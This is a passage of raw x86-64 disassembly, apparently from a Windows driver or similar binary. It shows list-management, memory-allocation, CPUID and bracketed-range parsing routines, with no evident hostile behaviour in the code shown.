   140003a6a:	48 83 c4 30          	add    $0x30,%rsp
   140003a6e:	41 5e                	pop    %r14
   140003a70:	c3                   	ret
   140003a71:	cc                   	int3
   140003a72:	cc                   	int3
   140003a73:	cc                   	int3
   140003a74:	40 53                	rex push %rbx
   140003a76:	48 83 ec 30          	sub    $0x30,%rsp
   140003a7a:	e8 21 fb ff ff       	call   0x1400035a0
   140003a7f:	84 c0                	test   %al,%al
   140003a81:	74 79                	je     0x140003afc
   140003a83:	8b 05 1f 7e 00 00    	mov    0x7e1f(%rip),%eax        # 0x14000b8a8
   140003a89:	ff c8                	dec    %eax
   140003a8b:	3d fe 01 00 00       	cmp    $0x1fe,%eax
   140003a90:	77 68                	ja     0x140003afa
   140003a92:	48 8d 0d 17 96 00 00 	lea    0x9617(%rip),%rcx        # 0x14000d0b0
   140003a99:	e8 a4 35 00 00       	call   0x140007042
   140003a9e:	48 8b d8             	mov    %rax,%rbx
   140003aa1:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003aa6:	03 db                	add    %ebx,%ebx
   140003aa8:	e8 73 e0 ff ff       	call   0x140001b20
   140003aad:	48 8b d0             	mov    %rax,%rdx
   140003ab0:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140003ab4:	4c 8d 0d f5 95 00 00 	lea    0x95f5(%rip),%r9        # 0x14000d0b0
   140003abb:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003ac1:	48 8d 0d e8 7d 00 00 	lea    0x7de8(%rip),%rcx        # 0x14000b8b0
   140003ac8:	e8 c3 18 00 00       	call   0x140005390
   140003acd:	33 c9                	xor    %ecx,%ecx
   140003acf:	e8 4c e0 ff ff       	call   0x140001b20
   140003ad4:	8b 0d d2 7d 00 00    	mov    0x7dd2(%rip),%ecx        # 0x14000b8ac
   140003ada:	4c 8d 0d cf 9d 00 00 	lea    0x9dcf(%rip),%r9        # 0x14000d8b0
   140003ae1:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140003ae5:	48 8b d0             	mov    %rax,%rdx
   140003ae8:	48 8d 0d c1 85 00 00 	lea    0x85c1(%rip),%rcx        # 0x14000c0b0
   140003aef:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140003af5:	e8 96 18 00 00       	call   0x140005390
   140003afa:	b0 01                	mov    $0x1,%al
   140003afc:	48 83 c4 30          	add    $0x30,%rsp
   140003b00:	5b                   	pop    %rbx
   140003b01:	c3                   	ret
   140003b02:	cc                   	int3
   140003b03:	cc                   	int3
   140003b04:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003b09:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003b0e:	57                   	push   %rdi
   140003b0f:	48 83 ec 20          	sub    $0x20,%rsp
   140003b13:	48 8b f2             	mov    %rdx,%rsi
   140003b16:	48 8b d9             	mov    %rcx,%rbx
   140003b19:	48 85 c9             	test   %rcx,%rcx
   140003b1c:	74 79                	je     0x140003b97
   140003b1e:	ff 15 54 46 00 00    	call   *0x4654(%rip)        # 0x140008178
   140003b24:	84 c0                	test   %al,%al
   140003b26:	74 6f                	je     0x140003b97
   140003b28:	48 83 7b 08 00       	cmpq   $0x0,0x8(%rbx)
   140003b2d:	74 68                	je     0x140003b97
   140003b2f:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   140003b33:	74 62                	je     0x140003b97
   140003b35:	ba 20 00 00 00       	mov    $0x20,%edx
   140003b3a:	33 c9                	xor    %ecx,%ecx
   140003b3c:	41 b8 78 61 64 76    	mov    $0x76646178,%r8d
   140003b42:	ff 15 c0 47 00 00    	call   *0x47c0(%rip)        # 0x140008308
   140003b48:	48 8b f8             	mov    %rax,%rdi
   140003b4b:	48 85 c0             	test   %rax,%rax
   140003b4e:	74 40                	je     0x140003b90
   140003b50:	48 8b c8             	mov    %rax,%rcx
   140003b53:	ff 15 1f 46 00 00    	call   *0x461f(%rip)        # 0x140008178
   140003b59:	84 c0                	test   %al,%al
   140003b5b:	74 33                	je     0x140003b90
   140003b5d:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140003b63:	48 8b d6             	mov    %rsi,%rdx
   140003b66:	48 8b cf             	mov    %rdi,%rcx
   140003b69:	e8 52 36 00 00       	call   0x1400071c0
   140003b6e:	48 8b 03             	mov    (%rbx),%rax
   140003b71:	48 39 58 08          	cmp    %rbx,0x8(%rax)
   140003b75:	74 07                	je     0x140003b7e
   140003b77:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003b7c:	cd 29                	int    $0x29
   140003b7e:	48 89 07             	mov    %rax,(%rdi)
   140003b81:	48 89 5f 08          	mov    %rbx,0x8(%rdi)
   140003b85:	48 89 78 08          	mov    %rdi,0x8(%rax)
   140003b89:	33 c0                	xor    %eax,%eax
   140003b8b:	48 89 3b             	mov    %rdi,(%rbx)
   140003b8e:	eb 0c                	jmp    0x140003b9c
   140003b90:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
   140003b95:	eb 05                	jmp    0x140003b9c
   140003b97:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140003b9c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003ba1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003ba6:	48 83 c4 20          	add    $0x20,%rsp
   140003baa:	5f                   	pop    %rdi
   140003bab:	c3                   	ret
   140003bac:	4c 8b dc             	mov    %rsp,%r11
   140003baf:	48 83 ec 48          	sub    $0x48,%rsp
   140003bb3:	33 c0                	xor    %eax,%eax
   140003bb5:	49 89 4b e8          	mov    %rcx,-0x18(%r11)
   140003bb9:	49 89 43 e0          	mov    %rax,-0x20(%r11)
   140003bbd:	48 8d 0d ec a0 00 00 	lea    0xa0ec(%rip),%rcx        # 0x14000dcb0
   140003bc4:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   140003bc8:	41 80 f8 01          	cmp    $0x1,%r8b
   140003bcc:	89 54 24 38          	mov    %edx,0x38(%rsp)
   140003bd0:	0f 44 c2             	cmove  %edx,%eax
   140003bd3:	49 8d 53 d8          	lea    -0x28(%r11),%rdx
   140003bd7:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   140003bdb:	e8 24 ff ff ff       	call   0x140003b04
   140003be0:	48 83 c4 48          	add    $0x48,%rsp
   140003be4:	c3                   	ret
   140003be5:	cc                   	int3
   140003be6:	cc                   	int3
   140003be7:	cc                   	int3
   140003be8:	48 8d 0d c1 a0 00 00 	lea    0xa0c1(%rip),%rcx        # 0x14000dcb0
   140003bef:	e9 cc e6 ff ff       	jmp    0x1400022c0
   140003bf4:	48 8d 0d b5 a0 00 00 	lea    0xa0b5(%rip),%rcx        # 0x14000dcb0
   140003bfb:	e9 14 e7 ff ff       	jmp    0x140002314
   140003c00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003c05:	57                   	push   %rdi
   140003c06:	48 83 ec 20          	sub    $0x20,%rsp
   140003c0a:	48 8b d9             	mov    %rcx,%rbx
   140003c0d:	48 8d 3d 9c a0 00 00 	lea    0xa09c(%rip),%rdi        # 0x14000dcb0
   140003c14:	48 8b cf             	mov    %rdi,%rcx
   140003c17:	ff 15 5b 45 00 00    	call   *0x455b(%rip)        # 0x140008178
   140003c1d:	84 c0                	test   %al,%al
   140003c1f:	74 31                	je     0x140003c52
   140003c21:	48 83 3d 8f a0 00 00 	cmpq   $0x0,0xa08f(%rip)        # 0x14000dcb8
   140003c28:	00 
   140003c29:	74 27                	je     0x140003c52
   140003c2b:	48 8b 15 7e a0 00 00 	mov    0xa07e(%rip),%rdx        # 0x14000dcb0
   140003c32:	48 85 d2             	test   %rdx,%rdx
   140003c35:	74 1b                	je     0x140003c52
   140003c37:	48 3b d7             	cmp    %rdi,%rdx
   140003c3a:	74 16                	je     0x140003c52
   140003c3c:	48 85 d2             	test   %rdx,%rdx
   140003c3f:	74 11                	je     0x140003c52
   140003c41:	48 39 5a 10          	cmp    %rbx,0x10(%rdx)
   140003c45:	74 05                	je     0x140003c4c
   140003c47:	48 8b 12             	mov    (%rdx),%rdx
   140003c4a:	eb eb                	jmp    0x140003c37
   140003c4c:	8b 42 18             	mov    0x18(%rdx),%eax
   140003c4f:	89 42 1c             	mov    %eax,0x1c(%rdx)
   140003c52:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003c57:	48 83 c4 20          	add    $0x20,%rsp
   140003c5b:	5f                   	pop    %rdi
   140003c5c:	c3                   	ret
   140003c5d:	cc                   	int3
   140003c5e:	cc                   	int3
   140003c5f:	cc                   	int3
   140003c60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003c65:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003c6a:	57                   	push   %rdi
   140003c6b:	48 83 ec 20          	sub    $0x20,%rsp
   140003c6f:	48 8b f9             	mov    %rcx,%rdi
   140003c72:	48 8d 35 37 a0 00 00 	lea    0xa037(%rip),%rsi        # 0x14000dcb0
   140003c79:	48 8b ce             	mov    %rsi,%rcx
   140003c7c:	8b da                	mov    %edx,%ebx
   140003c7e:	ff 15 f4 44 00 00    	call   *0x44f4(%rip)        # 0x140008178
   140003c84:	84 c0                	test   %al,%al
   140003c86:	74 2e                	je     0x140003cb6
   140003c88:	48 83 3d 28 a0 00 00 	cmpq   $0x0,0xa028(%rip)        # 0x14000dcb8
   140003c8f:	00 
   140003c90:	74 24                	je     0x140003cb6
   140003c92:	48 8b 05 17 a0 00 00 	mov    0xa017(%rip),%rax        # 0x14000dcb0
   140003c99:	48 85 c0             	test   %rax,%rax
   140003c9c:	74 18                	je     0x140003cb6
   140003c9e:	48 3b c6             	cmp    %rsi,%rax
   140003ca1:	74 13                	je     0x140003cb6
   140003ca3:	48 85 c0             	test   %rax,%rax
   140003ca6:	74 0e                	je     0x140003cb6
   140003ca8:	48 39 78 10          	cmp    %rdi,0x10(%rax)
   140003cac:	74 05                	je     0x140003cb3
   140003cae:	48 8b 00             	mov    (%rax),%rax
   140003cb1:	eb eb                	jmp    0x140003c9e
   140003cb3:	89 58 18             	mov    %ebx,0x18(%rax)
   140003cb6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003cbb:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003cc0:	48 83 c4 20          	add    $0x20,%rsp
   140003cc4:	5f                   	pop    %rdi
   140003cc5:	c3                   	ret
   140003cc6:	cc                   	int3
   140003cc7:	cc                   	int3
   140003cc8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003ccd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003cd2:	57                   	push   %rdi
   140003cd3:	48 83 ec 20          	sub    $0x20,%rsp
   140003cd7:	8b f9                	mov    %ecx,%edi
   140003cd9:	48 8d 35 d0 9f 00 00 	lea    0x9fd0(%rip),%rsi        # 0x14000dcb0
   140003ce0:	48 8b ce             	mov    %rsi,%rcx
   140003ce3:	ff 15 8f 44 00 00    	call   *0x448f(%rip)        # 0x140008178
   140003ce9:	84 c0                	test   %al,%al
   140003ceb:	74 47                	je     0x140003d34
   140003ced:	48 83 3d c3 9f 00 00 	cmpq   $0x0,0x9fc3(%rip)        # 0x14000dcb8
   140003cf4:	00 
   140003cf5:	74 3d                	je     0x140003d34
   140003cf7:	48 8b 1d b2 9f 00 00 	mov    0x9fb2(%rip),%rbx        # 0x14000dcb0
   140003cfe:	48 85 db             	test   %rbx,%rbx
   140003d01:	74 31                	je     0x140003d34
   140003d03:	eb 2a                	jmp    0x140003d2f
   140003d05:	48 85 db             	test   %rbx,%rbx
   140003d08:	74 2a                	je     0x140003d34
   140003d0a:	01 7b 1c             	add    %edi,0x1c(%rbx)
   140003d0d:	8b 43 1c             	mov    0x1c(%rbx),%eax
   140003d10:	3b 43 18             	cmp    0x18(%rbx),%eax
   140003d13:	72 17                	jb     0x140003d2c
   140003d15:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140003d19:	ff 15 51 46 00 00    	call   *0x4651(%rip)        # 0x140008370
   140003d1f:	84 c0                	test   %al,%al
   140003d21:	74 06                	je     0x140003d29
   140003d23:	83 63 1c 00          	andl   $0x0,0x1c(%rbx)
   140003d27:	eb 03                	jmp    0x140003d2c
   140003d29:	29 7b 1c             	sub    %edi,0x1c(%rbx)
   140003d2c:	48 8b 1b             	mov    (%rbx),%rbx
   140003d2f:	48 3b de             	cmp    %rsi,%rbx
   140003d32:	75 d1                	jne    0x140003d05
   140003d34:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003d39:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003d3e:	48 83 c4 20          	add    $0x20,%rsp
   140003d42:	5f                   	pop    %rdi
   140003d43:	c3                   	ret
   140003d44:	40 53                	rex push %rbx
   140003d46:	48 83 ec 20          	sub    $0x20,%rsp
   140003d4a:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140003d50:	32 db                	xor    %bl,%bl
   140003d52:	38 1d 88 a3 00 00    	cmp    %bl,0xa388(%rip)        # 0x14000e0e0
   140003d58:	75 04                	jne    0x140003d5e
   140003d5a:	32 c0                	xor    %al,%al
   140003d5c:	eb 4d                	jmp    0x140003dab
   140003d5e:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140003d63:	48 8d 15 16 39 00 00 	lea    0x3916(%rip),%rdx        # 0x140007680
   140003d6a:	48 8d 0d 6f a5 00 00 	lea    0xa56f(%rip),%rcx        # 0x14000e2e0
   140003d71:	e8 1e 15 00 00       	call   0x140005294
   140003d76:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003d7b:	85 c0                	test   %eax,%eax
   140003d7d:	78 1d                	js     0x140003d9c
   140003d7f:	48 85 c9             	test   %rcx,%rcx
   140003d82:	74 25                	je     0x140003da9
   140003d84:	48 8d 41 0c          	lea    0xc(%rcx),%rax
   140003d88:	48 85 c0             	test   %rax,%rax
   140003d8b:	74 0f                	je     0x140003d9c
   140003d8d:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   140003d91:	b8 01 00 00 00       	mov    $0x1,%eax
   140003d96:	0f b6 db             	movzbl %bl,%ebx
   140003d99:	0f 45 d8             	cmovne %eax,%ebx
   140003d9c:	48 85 c9             	test   %rcx,%rcx
   140003d9f:	74 08                	je     0x140003da9
   140003da1:	33 d2                	xor    %edx,%edx
   140003da3:	ff 15 97 45 00 00    	call   *0x4597(%rip)        # 0x140008340
   140003da9:	8a c3                	mov    %bl,%al
   140003dab:	48 83 c4 20          	add    $0x20,%rsp
   140003daf:	5b                   	pop    %rbx
   140003db0:	c3                   	ret
   140003db1:	cc                   	int3
   140003db2:	cc                   	int3
   140003db3:	cc                   	int3
   140003db4:	40 53                	rex push %rbx
   140003db6:	48 83 ec 20          	sub    $0x20,%rsp
   140003dba:	48 8d 0d 57 bb 00 00 	lea    0xbb57(%rip),%rcx        # 0x14000f918
   140003dc1:	ff 15 11 44 00 00    	call   *0x4411(%rip)        # 0x1400081d8
   140003dc7:	48 8d 0d 3a bb 00 00 	lea    0xbb3a(%rip),%rcx        # 0x14000f908
   140003dce:	8a d8                	mov    %al,%bl
   140003dd0:	e8 eb e4 ff ff       	call   0x1400022c0
   140003dd5:	8a d3                	mov    %bl,%dl
   140003dd7:	48 8d 0d 3a bb 00 00 	lea    0xbb3a(%rip),%rcx        # 0x14000f918
   140003dde:	ff 15 fc 43 00 00    	call   *0x43fc(%rip)        # 0x1400081e0
   140003de4:	48 8b 0d d5 9e 00 00 	mov    0x9ed5(%rip),%rcx        # 0x14000dcc0
   140003deb:	bb 51 61 78 58       	mov    $0x58786151,%ebx
   140003df0:	48 85 c9             	test   %rcx,%rcx
   140003df3:	74 08                	je     0x140003dfd
   140003df5:	8b d3                	mov    %ebx,%edx
   140003df7:	ff 15 43 45 00 00    	call   *0x4543(%rip)        # 0x140008340
   140003dfd:	48 8b 0d c4 9e 00 00 	mov    0x9ec4(%rip),%rcx        # 0x14000dcc8
   140003e04:	48 85 c9             	test   %rcx,%rcx
   140003e07:	74 08                	je     0x140003e11
   140003e09:	8b d3                	mov    %ebx,%edx
   140003e0b:	ff 15 2f 45 00 00    	call   *0x452f(%rip)        # 0x140008340
   140003e11:	48 83 c4 20          	add    $0x20,%rsp
   140003e15:	5b                   	pop    %rbx
   140003e16:	c3                   	ret
   140003e17:	cc                   	int3
   140003e18:	40 53                	rex push %rbx
   140003e1a:	48 83 ec 30          	sub    $0x30,%rsp
   140003e1e:	33 c9                	xor    %ecx,%ecx
   140003e20:	b8 01 00 00 00       	mov    $0x1,%eax
   140003e25:	0f a2                	cpuid
   140003e27:	44 8b c2             	mov    %edx,%r8d
   140003e2a:	48 8d 0d af b0 00 00 	lea    0xb0af(%rip),%rcx        # 0x14000eee0
   140003e31:	48 8d 15 08 38 00 00 	lea    0x3808(%rip),%rdx        # 0x140007640
   140003e38:	44 8b c8             	mov    %eax,%r9d
   140003e3b:	48 83 c4 30          	add    $0x30,%rsp
   140003e3f:	5b                   	pop    %rbx
   140003e40:	e9 df 31 00 00       	jmp    0x140007024
   140003e45:	cc                   	int3
   140003e46:	cc                   	int3
   140003e47:	cc                   	int3
   140003e48:	83 f9 04             	cmp    $0x4,%ecx
   140003e4b:	77 12                	ja     0x140003e5f
   140003e4d:	48 63 c1             	movslq %ecx,%rax
   140003e50:	48 8d 0d a9 b0 00 00 	lea    0xb0a9(%rip),%rcx        # 0x14000ef00
   140003e57:	48 c1 e0 09          	shl    $0x9,%rax
   140003e5b:	48 03 c1             	add    %rcx,%rax
   140003e5e:	c3                   	ret
   140003e5f:	33 c0                	xor    %eax,%eax
   140003e61:	c3                   	ret
   140003e62:	cc                   	int3
   140003e63:	cc                   	int3
   140003e64:	40 53                	rex push %rbx
   140003e66:	48 83 ec 20          	sub    $0x20,%rsp
   140003e6a:	48 8b d9             	mov    %rcx,%rbx
   140003e6d:	e8 a6 ff ff ff       	call   0x140003e18
   140003e72:	48 8d 0d 8f ba 00 00 	lea    0xba8f(%rip),%rcx        # 0x14000f908
   140003e79:	e8 96 e4 ff ff       	call   0x140002314
   140003e7e:	48 89 1d 7b ba 00 00 	mov    %rbx,0xba7b(%rip)        # 0x14000f900
   140003e85:	48 83 c4 20          	add    $0x20,%rsp
   140003e89:	5b                   	pop    %rbx
   140003e8a:	c3                   	ret
   140003e8b:	cc                   	int3
   140003e8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003e91:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140003e96:	56                   	push   %rsi
   140003e97:	57                   	push   %rdi
   140003e98:	41 54                	push   %r12
   140003e9a:	41 56                	push   %r14
   140003e9c:	41 57                	push   %r15
   140003e9e:	48 83 ec 20          	sub    $0x20,%rsp
   140003ea2:	8b e9                	mov    %ecx,%ebp
   140003ea4:	33 ff                	xor    %edi,%edi
   140003ea6:	48 8d 0d 6b ba 00 00 	lea    0xba6b(%rip),%rcx        # 0x14000f918
   140003ead:	8b f7                	mov    %edi,%esi
   140003eaf:	4c 8b f2             	mov    %rdx,%r14
   140003eb2:	ff 15 20 43 00 00    	call   *0x4320(%rip)        # 0x1400081d8
   140003eb8:	4c 8d 25 49 ba 00 00 	lea    0xba49(%rip),%r12        # 0x14000f908
   140003ebf:	44 8a f8             	mov    %al,%r15b
   140003ec2:	49 8b cc             	mov    %r12,%rcx
   140003ec5:	ff 15 ad 42 00 00    	call   *0x42ad(%rip)        # 0x140008178
   140003ecb:	84 c0                	test   %al,%al
   140003ecd:	74 3c                	je     0x140003f0b
   140003ecf:	48 39 3d 3a ba 00 00 	cmp    %rdi,0xba3a(%rip)        # 0x14000f910
   140003ed6:	74 33                	je     0x140003f0b
   140003ed8:	48 8b 1d 29 ba 00 00 	mov    0xba29(%rip),%rbx        # 0x14000f908
   140003edf:	48 85 db             	test   %rbx,%rbx
   140003ee2:	74 27                	je     0x140003f0b
   140003ee4:	49 3b dc             	cmp    %r12,%rbx
   140003ee7:	74 22                	je     0x140003f0b
   140003ee9:	48 85 db             	test   %rbx,%rbx
   140003eec:	74 1d                	je     0x140003f0b
   140003eee:	48 8b cb             	mov    %rbx,%rcx
   140003ef1:	ff 15 81 42 00 00    	call   *0x4281(%rip)        # 0x140008178
   140003ef7:	84 c0                	test   %al,%al
   140003ef9:	74 05                	je     0x140003f00
   140003efb:	39 6b 10             	cmp    %ebp,0x10(%rbx)
   140003efe:	74 05                	je     0x140003f05
   140003f00:	48 8b 1b             	mov    (%rbx),%rbx
   140003f03:	eb df                	jmp    0x140003ee4
   140003f05:	8b 7b 14             	mov    0x14(%rbx),%edi
   140003f08:	8b 73 18             	mov    0x18(%rbx),%esi
   140003f0b:	41 8a d7             	mov    %r15b,%dl
   140003f0e:	48 8d 0d 03 ba 00 00 	lea    0xba03(%rip),%rcx        # 0x14000f918
   140003f15:	ff 15 c5 42 00 00    	call   *0x42c5(%rip)        # 0x1400081e0
   140003f1b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003f20:	8b c7                	mov    %edi,%eax
   140003f22:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140003f27:	41 89 36             	mov    %esi,(%r14)
   140003f2a:	48 83 c4 20          	add    $0x20,%rsp
   140003f2e:	41 5f                	pop    %r15
   140003f30:	41 5e                	pop    %r14
   140003f32:	41 5c                	pop    %r12
   140003f34:	5f                   	pop    %rdi
   140003f35:	5e                   	pop    %rsi
   140003f36:	c3                   	ret
   140003f37:	cc                   	int3
   140003f38:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140003f3d:	57                   	push   %rdi
   140003f3e:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   140003f45:	48 8b 05 64 78 00 00 	mov    0x7864(%rip),%rax        # 0x14000b7b0
   140003f4c:	48 33 c4             	xor    %rsp,%rax
   140003f4f:	48 89 84 24 30 02 00 	mov    %rax,0x230(%rsp)
   140003f56:	00 
   140003f57:	8b fa                	mov    %edx,%edi
   140003f59:	48 8b d9             	mov    %rcx,%rbx
   140003f5c:	33 d2                	xor    %edx,%edx
   140003f5e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003f63:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140003f69:	e8 12 35 00 00       	call   0x140007480
   140003f6e:	ba 00 02 00 00       	mov    $0x200,%edx
   140003f73:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003f78:	e8 eb d8 ff ff       	call   0x140001868
   140003f7d:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003f82:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003f87:	ff 15 bb 43 00 00    	call   *0x43bb(%rip)        # 0x140008348
   140003f8d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003f92:	e8 9d db ff ff       	call   0x140001b34
   140003f97:	44 8b c7             	mov    %edi,%r8d
   140003f9a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003f9f:	48 8b d3             	mov    %rbx,%rdx
   140003fa2:	e8 49 e2 ff ff       	call   0x1400021f0
   140003fa7:	48 8b 8c 24 30 02 00 	mov    0x230(%rsp),%rcx
   140003fae:	00 
   140003faf:	48 33 cc             	xor    %rsp,%rcx
   140003fb2:	e8 f9 30 00 00       	call   0x1400070b0
   140003fb7:	48 8b 9c 24 60 02 00 	mov    0x260(%rsp),%rbx
   140003fbe:	00 
   140003fbf:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   140003fc6:	5f                   	pop    %rdi
   140003fc7:	c3                   	ret
   140003fc8:	48 8b c4             	mov    %rsp,%rax
   140003fcb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003fcf:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140003fd3:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140003fd7:	4c 89 60 20          	mov    %r12,0x20(%rax)
   140003fdb:	55                   	push   %rbp
   140003fdc:	41 56                	push   %r14
   140003fde:	41 57                	push   %r15
   140003fe0:	48 8b ec             	mov    %rsp,%rbp
   140003fe3:	48 83 ec 60          	sub    $0x60,%rsp
   140003fe7:	33 db                	xor    %ebx,%ebx
   140003fe9:	33 c0                	xor    %eax,%eax
   140003feb:	48 39 1d 0e b9 00 00 	cmp    %rbx,0xb90e(%rip)        # 0x14000f900
   140003ff2:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003ff5:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   140003ff9:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140003ffd:	44 8b fb             	mov    %ebx,%r15d
   140004000:	44 8b e3             	mov    %ebx,%r12d
   140004003:	0f 84 be 01 00 00    	je     0x1400041c7
   140004009:	38 1d f1 b0 00 00    	cmp    %bl,0xb0f1(%rip)        # 0x14000f100
   14000400f:	0f 84 b2 01 00 00    	je     0x1400041c7
   140004015:	8d 70 01             	lea    0x1(%rax),%esi
   140004018:	40 38 35 b5 9c 00 00 	cmp    %sil,0x9cb5(%rip)        # 0x14000dcd4
   14000401f:	0f 84 a2 01 00 00    	je     0x1400041c7
   140004025:	ba 00 08 00 00       	mov    $0x800,%edx
   14000402a:	48 8d 3d af a6 00 00 	lea    0xa6af(%rip),%rdi        # 0x14000e6e0
   140004031:	8b ca                	mov    %edx,%ecx
   140004033:	f3 aa                	rep stos %al,(%rdi)
   140004035:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140004039:	e8 3a 2e 00 00       	call   0x140006e78
   14000403e:	84 c0                	test   %al,%al
   140004040:	0f 84 81 01 00 00    	je     0x1400041c7
   140004046:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   14000404a:	48 8d 0d af b0 00 00 	lea    0xb0af(%rip),%rcx        # 0x14000f100
   140004051:	e8 32 1f 00 00       	call   0x140005f88
   140004056:	84 c0                	test   %al,%al
   140004058:	0f 84 69 01 00 00    	je     0x1400041c7
   14000405e:	8d 4b 03             	lea    0x3(%rbx),%ecx
   140004061:	e8 7e da ff ff       	call   0x140001ae4
   140004066:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000406a:	4c 8b f0             	mov    %rax,%r14
   14000406d:	e8 a6 2e 00 00       	call   0x140006f18
   140004072:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140004076:	48 8b f8             	mov    %rax,%rdi
   140004079:	e8 9a 2d 00 00       	call   0x140006e18
   14000407e:	48 83 ff 1e          	cmp    $0x1e,%rdi
   140004082:	0f 86 3f 01 00 00    	jbe    0x1400041c7
   140004088:	44 8d 43 1e          	lea    0x1e(%rbx),%r8d
   14000408c:	49 8b d6             	mov    %r14,%rdx
   14000408f:	48 8b c8             	mov    %rax,%rcx
   140004092:	e8 85 13 00 00       	call   0x14000541c
   140004097:	48 85 c0             	test   %rax,%rax
   14000409a:	0f 84 27 01 00 00    	je     0x1400041c7
   1400040a0:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400040a4:	e8 6f 2e 00 00       	call   0x140006f18
   1400040a9:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400040ad:	48 8b f8             	mov    %rax,%rdi
   1400040b0:	e8 63 2d 00 00       	call   0x140006e18
   1400040b5:	48 8b c8             	mov    %rax,%rcx
   1400040b8:	48 8b d7             	mov    %rdi,%rdx
   1400040bb:	e8 84 1e 00 00       	call   0x140005f44
   1400040c0:	48 8b f8             	mov    %rax,%rdi
   1400040c3:	48 85 c0             	test   %rax,%rax
   1400040c6:	0f 84 fb 00 00 00    	je     0x1400041c7
   1400040cc:	8a 00                	mov    (%rax),%al
   1400040ce:	e9 ca 00 00 00       	jmp    0x14000419d
   1400040d3:	3c 5b                	cmp    $0x5b,%al
   1400040d5:	75 5a                	jne    0x140004131
   1400040d7:	48 03 fe             	add    %rsi,%rdi
   1400040da:	44 8b fb             	mov    %ebx,%r15d
   1400040dd:	44 8b e3             	mov    %ebx,%r12d
   1400040e0:	8a 07                	mov    (%rdi),%al
   1400040e2:	3c 2d                	cmp    $0x2d,%al
   1400040e4:	74 27                	je     0x14000410d
   1400040e6:	8a d0                	mov    %al,%dl
   1400040e8:	8a c2                	mov    %dl,%al
   1400040ea:	80 fa 5d             	cmp    $0x5d,%dl
   1400040ed:	74 1a                	je     0x140004109
   1400040ef:	0f be c2             	movsbl %dl,%eax
   1400040f2:	47 8d 3c bf          	lea    (%r15,%r15,4),%r15d
   1400040f6:	48 03 fe             	add    %rsi,%rdi
   1400040f9:	45 8d 7f e8          	lea    -0x18(%r15),%r15d
   1400040fd:	46 8d 3c 78          	lea    (%rax,%r15,2),%r15d
   140004101:	8a 07                	mov    (%rdi),%al
   140004103:	8a d0                	mov    %al,%dl
   140004105:	3c 2d                	cmp    $0x2d,%al
   140004107:	75 df                	jne    0x1400040e8
   140004109:	3c 2d                	cmp    $0x2d,%al
   14000410b:	75 24                	jne    0x140004131
   14000410d:	48 03 fe             	add    %rsi,%rdi
   140004110:	8a 07                	mov    (%rdi),%al
   140004112:	3c 5d                	cmp    $0x5d,%al
   140004114:	74 1b                	je     0x140004131
   140004116:	0f be c0             	movsbl %al,%eax
   140004119:	47 8d 24 a4          	lea    (%r12,%r12,4),%r12d
   14000411d:	48 03 fe             	add    %rsi,%rdi
   140004120:	45 8d 64 24 e8       	lea    -0x18(%r12),%r12d
   140004125:	46 8d 24 60          	lea    (%rax,%r12,2),%r12d
   140004129:	8a 07                	mov    (%rdi),%al
   14000412b:	3c 5d                	cmp    $0x5d,%al
   14000412d:	75 e7                	jne    0x140004116
   14000412f:	eb 67                	jmp    0x140004198
   140004131:	3c 7b                	cmp    $0x7b,%al
   140004133:	75 63                	jne    0x140004198
   140004135:	eb 56                	jmp    0x14000418d
   140004137:	44 8b f3             	mov    %ebx,%r14d
